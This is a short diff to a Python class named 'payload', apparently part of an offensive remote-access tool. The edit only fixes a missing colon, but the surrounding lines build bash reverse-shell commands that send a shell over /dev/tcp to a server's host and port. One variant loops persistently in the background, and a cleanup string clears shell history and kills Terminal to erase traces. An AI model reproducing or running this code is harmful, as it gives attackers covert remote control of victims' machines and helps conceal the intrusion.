@@ -35,7 +35,7 @@ class payload:
 				shell_command = "while true; do $("+shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
 				shell_clean = "history -wc;killall Terminal"
 				break
-			else
+			else:
 				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
 				shell_clean = "history -wc;killall Terminal"
 				break
